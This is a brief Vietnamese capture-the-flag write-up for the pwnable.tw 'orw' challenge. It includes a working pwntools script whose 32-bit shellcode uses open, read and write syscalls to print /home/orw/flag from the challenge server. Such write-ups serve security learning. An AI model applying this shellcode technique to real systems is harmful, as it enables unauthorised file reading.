---
title: Orw

---

# Orw
![image](https://hackmd.io/_uploads/Hyvf9wn20.png)
- Chương trình cũng cho ta một file nhị phân
- kiểm tra checksec
![image](https://hackmd.io/_uploads/SyVitvnnC.png)
- Chạy thử chương trình 
![image](https://hackmd.io/_uploads/HytAtv230.png)
- Dường như chương trình cho ta nhập một shellcode
- Nhưng theo đề bài chỉ có được syscall các hàm `open, read, write` và file flag ở `/home/orw/flag`
- Ta cần viết shellcode theo các bước
    - `open` 
    - `read`  
    - `write` 
- Cần đưa chuỗi `/home/orw/flag` vào stack để set tham số để `open`, vì 32 bit nên mỗi lần đưa vào 4 bytebyte
```
push 26465 # 'ag\x00\x00'
push 1818636151 # 'w/fl'
push 1919889253 # 'e/or'
push 1836017711 # '/hom'
```

```python=
#!/usr/bin/python

from pwn import *

context.arch = 'i386'
context.os = 'linux'

#p = process('./orw')
p = remote('chall.pwnable.tw', 10001)

shell = asm('''
	push 26465 
	push 1818636151 
	push 1919889253 
	push 1836017711

	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov eax, 0x5
	int 0x80

	mov ebx, eax
	mov eax, 0x3
	mov ecx, esi
	mov edx, 0x100
	int 0x80

	mov ebx, 0x1
	mov ecx, esi
	mov eax, 0x4
	int 0x80
''')


p.sendafter(b'shellcode:',shell)

p.interactive()
```